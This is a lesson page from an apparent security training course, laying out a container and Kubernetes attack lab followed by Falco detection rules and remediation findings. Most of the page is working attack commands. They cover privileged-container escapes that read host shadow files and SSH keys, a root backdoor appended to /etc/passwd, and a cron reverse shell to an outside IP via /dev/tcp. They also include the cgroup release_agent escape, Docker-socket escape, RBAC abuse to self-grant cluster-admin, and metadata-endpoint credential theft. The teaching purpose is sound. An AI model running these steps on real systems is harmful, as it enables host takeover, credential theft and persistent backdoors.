---
title: "Cloud Practice — Container and Kubernetes Attack Lab"
tags: [cloud-practice, containers, Docker, Kubernetes, EKS, ECS, privileged-escape,
       Docker-socket, RBAC, service-account, kubelet, Falco, ATT&CK-T1611, lab]
module: 04-BroadSurface-02
day: 206
related_topics:
  - Container and ECS Attacks (Day 188)
  - Cloud Persistence Techniques (Day 191)
  - Cloud Full Attack Lab (Day 192)
  - Detecting Cloud Attacks (Day 194)
---

# Day 206 — Cloud Practice: Container and Kubernetes Attack Lab

> "Containers are not a security boundary. They are a packaging format.
> `--privileged` is a loaded weapon handed to whoever runs the image.
> A Docker socket mounted inside a container is the keys to the host.
> Misconfigured Kubernetes RBAC is an open door with a sign that says
> 'admin access, help yourself.' Every one of these is a real finding.
> Today you find all of them."
>
> — Ghost

---

## Goals

By the end of today's practice session you will be able to:

1. Enumerate a Kubernetes cluster from inside a compromised pod and identify
   RBAC misconfigurations.
2. Escape from a privileged Docker container to the host OS via two distinct
   techniques.
3. Extract ECS task role credentials from the container metadata endpoint.
4. Write detection rules for container escape and Kubernetes RBAC abuse.
5. Document all findings in professional format.

**Estimated time:** 6–8 hours.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| Container and ECS Attacks | Day 188 |
| Cloud Persistence Techniques | Day 191 |
| Docker installed | System dependency |
| kubectl installed | `curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"` |
| kind (Kubernetes in Docker) | `go install sigs.k8s.io/kind@v0.22.0` |

---

## Lab Setup

### Option A — Local Kind Cluster (Preferred)

```bash
# Install kind
curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.22.0/kind-linux-amd64
chmod +x ./kind && mv ./kind /usr/local/bin/kind

# Create a vulnerable lab cluster
cat > lab-cluster.yaml << 'EOF'
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
- role: control-plane
- role: worker
EOF

kind create cluster --config lab-cluster.yaml --name cloud-lab
kubectl cluster-info --context kind-cloud-lab

# Deploy the vulnerable workloads
kubectl apply -f https://raw.githubusercontent.com/ghost-lab/cloud-practice/\
main/container-lab/vulnerable-workloads.yaml
# OR: create manually (see Block 1 setup below)
```

### Option B — LocalStack + Docker Compose (AWS simulation)

```bash
# docker-compose.yml already provided in samples directory
cd 04-BroadSurface-02/samples/container-lab/
docker compose up -d

# Containers started:
# - privileged-target: a container running with --privileged
# - docker-socket-target: a container with /var/run/docker.sock mounted
# - eks-simulation: simulates an EKS node with task metadata endpoint
```

---

## Block 1 — Privileged Container Escape (90 min)

### 1.1 — Deploy and Enter the Privileged Container

```bash
# Deploy a privileged container (lab target)
docker run -d \
  --name privesc-target \
  --privileged \
  -v /:/host \
  ubuntu:22.04 \
  sleep infinity

# Enter the container (simulate RCE inside it)
docker exec -it privesc-target bash
```

### 1.2 — Escape Technique 1: Host Filesystem Mount

```bash
# Inside the container:
# We are root in the container. With --privileged and /:/host mounted,
# the host filesystem is directly readable.

ls /host/etc/shadow        # Host shadow file — read password hashes
cat /host/root/.ssh/id_rsa  # Host root SSH private key
cat /host/etc/kubernetes/admin.conf 2>/dev/null  # Kubernetes admin config

# Write to the host filesystem (persistence)
echo "container-escape-root::0:0:root:/root:/bin/bash" >> /host/etc/passwd
# (lab only — this adds a root backdoor to the HOST /etc/passwd)

# OR: write a cron job to the host
echo "* * * * * root bash -i >& /dev/tcp/10.0.0.1/9999 0>&1" \
  >> /host/etc/cron.d/backdoor
```

**Document:** what host data did you access? What persistence did you establish?

### 1.3 — Escape Technique 2: cgroup release_agent

```bash
# Inside the container (must be privileged):
# This technique uses Linux cgroup release_agent to execute on the HOST.

# Step 1: Find a writable cgroup
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x

# Step 2: Set up the release_agent (runs on the host when cgroup is released)
echo 1 > /tmp/cgrp/x/notify_on_release

# Step 3: Find the host path for /tmp/cgrp/x
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /proc/mounts | head -1)

# Step 4: Create a payload script on the container filesystem
# (accessible from the host as /host/cmd via the mounted path)
echo "#!/bin/sh
id > ${host_path}/output
cat /etc/shadow >> ${host_path}/output" > /cmd
chmod +x /cmd

# Step 5: Write the release_agent to execute our payload
echo "${host_path}/cmd" > /tmp/cgrp/release_agent

# Step 6: Trigger the release
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Step 7: Wait and read the output written by the HOST
cat /output  # Should show root:x:0:0:... — we ran on the HOST as root
```

---

## Block 2 — Docker Socket Escape (60 min)

```bash
# Deploy a container with the Docker socket mounted
docker run -d \
  --name socket-target \
  -v /var/run/docker.sock:/var/run/docker.sock \
  ubuntu:22.04 \
  sleep infinity

# Enter the container
docker exec -it socket-target bash

# Install Docker client inside the container
apt-get update -qq && apt-get install -y docker.io -qq

# We can now control the HOST Docker daemon
docker ps          # List HOST containers
docker images      # List HOST images

# Escape: create a new PRIVILEGED container with full host filesystem
docker run -it \
  --privileged \
  --net=host \
  --pid=host \
  -v /:/host \
  ubuntu:22.04 \
  bash

# Now inside the new container — we have full host access
chroot /host        # chroot into the host OS
id                  # → uid=0(root)
cat /etc/shadow
ls /root/.ssh/
```

**Detection exercise:** what Docker events / system calls does this generate?

```bash
# From the host machine, monitor Docker events during the escape
docker events --filter event=create --filter event=start
# You should see: a new container created from inside a container — anomalous
```

---

## Block 3 — Kubernetes RBAC Exploitation (90 min)

### 3.1 — Deploy a Vulnerable Pod

```bash
# Create a namespace and a service account with misconfigured RBAC
kubectl create namespace vulnerable-ns

# Create an overly permissive cluster role
cat << 'EOF' | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: vulnerable-clusterrole
rules:
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["get", "list", "watch"]      # reads ALL secrets cluster-wide
- apiGroups: [""]
  resources: ["pods/exec"]
  verbs: ["create"]                    # can exec into any pod
- apiGroups: ["rbac.authorization.k8s.io"]
  resources: ["clusterrolebindings"]
  verbs: ["get", "list", "create"]     # can create new role bindings
EOF

# Bind it to a service account
kubectl create serviceaccount attacker-sa -n vulnerable-ns
kubectl create clusterrolebinding attacker-binding \
  --clusterrole=vulnerable-clusterrole \
  --serviceaccount=vulnerable-ns:attacker-sa

# Deploy the vulnerable pod using this service account
cat << 'EOF' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
  namespace: vulnerable-ns
spec:
  serviceAccountName: attacker-sa
  containers:
  - name: attacker
    image: bitnami/kubectl:latest
    command: ["sleep", "infinity"]
EOF
```

### 3.2 — Exploit from Inside the Pod

```bash
# Exec into the pod (simulate code execution)
kubectl exec -it attacker-pod -n vulnerable-ns -- bash

# Inside the pod — the service account token is auto-mounted
ls /var/run/secrets/kubernetes.io/serviceaccount/
# token  namespace  ca.crt

# Read the token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc

# Enumerate cluster secrets
curl -s $APISERVER/api/v1/secrets \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  --header "Authorization: Bearer $TOKEN" | jq '.items[].metadata.name'

# Read a specific secret
curl -s $APISERVER/api/v1/namespaces/kube-system/secrets/cluster-admin-token \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  --header "Authorization: Bearer $TOKEN" | \
  jq -r '.data.token' | base64 -d

# Attempt privilege escalation: create a ClusterRoleBinding for ourselves
# giving us cluster-admin
curl -s -X POST $APISERVER/apis/rbac.authorization.k8s.io/v1/clusterrolebindings \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  --header "Authorization: Bearer $TOKEN" \
  --header "Content-Type: application/json" \
  -d '{
    "apiVersion": "rbac.authorization.k8s.io/v1",
    "kind": "ClusterRoleBinding",
    "metadata": {"name": "attacker-escalation"},
    "roleRef": {"apiGroup": "rbac.authorization.k8s.io", "kind": "ClusterRole",
                "name": "cluster-admin"},
    "subjects": [{"kind": "ServiceAccount", "name": "attacker-sa",
                  "namespace": "vulnerable-ns"}]
  }'

# Verify cluster-admin access
curl -s $APISERVER/api/v1/namespaces \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  --header "Authorization: Bearer $TOKEN" | jq '.items[].metadata.name'
```

---

## Block 4 — ECS Task Role Credential Extraction (45 min)

```bash
# Simulate an ECS container environment
# The task metadata endpoint is at 169.254.170.2 (not 169.254.169.254)
# ECS sets $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI

docker run -it \
  --name ecs-target \
  -e AWS_CONTAINER_CREDENTIALS_RELATIVE_URI="/v2/credentials/abc-def-ghi" \
  ubuntu:22.04 \
  bash

# Inside container — simulate SSRF or RCE reaching the metadata endpoint
# (In a real ECS environment, 169.254.170.2 is the metadata service)
# In this lab, we simulate with the local Docker network

# Real ECS credential extraction (on an actual ECS task):
curl "http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}"
# Returns: AccessKeyId, SecretAccessKey, SessionToken, Expiration, RoleArn

# Compare to EC2 IMDS:
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# ECS task endpoint: no token required (no IMDSv2 equivalent)
# → higher SSRF exploitability than EC2 with IMDSv2
```

---

## Block 5 — Detection: Write Falco Rules (45 min)

```bash
# Install Falco (if not present)
curl -fsSL https://falco.org/repo/falcosecurity-packages.asc | \
  sudo gpg --dearmor -o /usr/share/keyrings/falco-archive-keyring.gpg
echo "deb [signed-by=/usr/share/keyrings/falco-archive-keyring.gpg] \
  https://download.falco.org/packages/deb stable main" | \
  sudo tee -a /etc/apt/sources.list.d/falcosecurity.list
sudo apt-get update && sudo apt-get install falco -y
```

Write Falco rules targeting your lab attacks:

```yaml
# custom_container_rules.yaml

# Rule 1: Privileged container started
- rule: Privileged Container Launch
  desc: Detect launch of a privileged container
  condition: >
    container.privileged = true and evt.type = container
  output: >
    Privileged container started (container=%container.name
    image=%container.image.repository:%container.image.tag
    user=%user.name pid=%proc.pid)
  priority: CRITICAL
  tags: [container, privilege-escalation, T1611]

# Rule 2: Docker socket accessed from a container
- rule: Docker Socket Access from Container
  desc: A container process is accessing the Docker socket
  condition: >
    open_write and container and
    fd.name = /var/run/docker.sock
  output: >
    Docker socket accessed from container
    (container=%container.name proc=%proc.name
    cmdline=%proc.cmdline user=%user.name)
  priority: CRITICAL
  tags: [container, docker-socket, T1611]

# Rule 3: Suspicious cgroup write (escape attempt)
- rule: Container cgroup Release Agent Write
  desc: Possible cgroup escape attempt via release_agent
  condition: >
    open_write and container and
    (fd.name contains "release_agent" or
     fd.name contains "notify_on_release")
  output: >
    Possible cgroup escape (container=%container.name
    proc=%proc.name file=%fd.name)
  priority: CRITICAL
  tags: [container, escape, T1611]

# Rule 4: kubectl exec inside a pod (lateral movement)
- rule: Kubectl Exec Inside Pod
  desc: A process inside a pod is calling the Kubernetes API to exec
  condition: >
    spawned_process and container and
    proc.name = kubectl and
    proc.args contains "exec"
  output: >
    kubectl exec called from inside a pod (container=%container.name
    cmdline=%proc.cmdline)
  priority: HIGH
  tags: [kubernetes, lateral-movement, T1609]
```

```bash
# Test the rules against your lab attacks
falco -r custom_container_rules.yaml -o json_output=true &

# Trigger the privileged container launch — Falco should alert
docker run --privileged ubuntu:22.04 echo "test"

# Check Falco output
tail -f /var/log/falco/falco.log | jq .
```

---

## Findings Documentation

Write a complete finding for each confirmed vulnerability:

| # | Finding | Severity | CWE | ATT&CK | Fix |
|---|---|---|---|---|---|
| 1 | Privileged container with host mount | Critical | CWE-250 | T1611 | Remove `--privileged`; use seccomp/AppArmor |
| 2 | Docker socket mounted in container | Critical | CWE-269 | T1611 | Remove socket mount from non-admin containers |
| 3 | Kubernetes: `secrets:list` cluster-wide | High | CWE-269 | T1552 | Namespace-scope secrets access; no list |
| 4 | Kubernetes: `clusterrolebindings:create` | Critical | CWE-269 | T1098 | Remove RBAC verbs; audit bindings weekly |
| 5 | ECS task metadata no auth | Medium | CWE-306 | T1552.005 | Network policy blocking 169.254.170.2 from app code |

---

## Key Takeaways

1. **`--privileged` + host mount = container is just a namespace.** The filesystem,
   network, and processes of the host are fully accessible. There is no security
   boundary remaining.
2. **Docker socket mount is equivalent to root on the host.** Any process that
   can connect to `/var/run/docker.sock` can create privileged containers and
   escape. Never mount it in application containers.
3. **Kubernetes RBAC is additive — too-permissive is common.** Developers grant
   `get`, `list`, `watch` on `secrets` thinking it is read-only. `list secrets`
   returns all secret values. One misconfigured service account = cluster-wide
   secret exposure.
4. **ECS task metadata has no IMDSv2 equivalent.** The task credential endpoint
   requires only network access, not a token hop. SSRF to the ECS metadata
   endpoint is strictly easier than SSRF to EC2 IMDSv2.
5. **Falco is your real-time container escape detector.** It monitors syscalls
   at the kernel level — cgroup writes, socket connections, privileged spawns.
   A well-tuned Falco ruleset catches every technique practised today in real time.

---

## Exercises

1. Write a `docker run` command that launches a container with NO capabilities
   and a read-only root filesystem. Confirm via `cat /proc/1/status` that no
   capabilities are present. Attempt the cgroup escape — confirm it fails.

2. Run `kubectl auth can-i --list --as system:serviceaccount:vulnerable-ns:attacker-sa`
   from the host. Compare the output to what you found by manually querying the
   API. Are there permissions `can-i` shows that you didn't attempt to exploit?

3. Write a Python script that, given an ECS task credential endpoint URL, extracts
   credentials and calls `sts:GetCallerIdentity` + `iam:ListAttachedRolePolicies`
   to determine what the task role can do.

4. Add a fifth Falco rule: detect when a container process reads
   `/proc/1/cgroup` — a common first step in container escape enumeration.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q206.1, Q206.2 …).
> Follow-up questions use hierarchical numbering (Q206.1.1, Q206.1.2 …).

---

## Navigation

← Previous: [Day 205 — Cloud Practice: Bug Bounty Recon](DAY-0205-Cloud-Practice-Bug-Bounty-Recon.md)
→ Next: [Day 207 — Cloud Practice: Full Kill Chain Speed Run](DAY-0207-Cloud-Practice-Kill-Chain-Speed-Run.md)
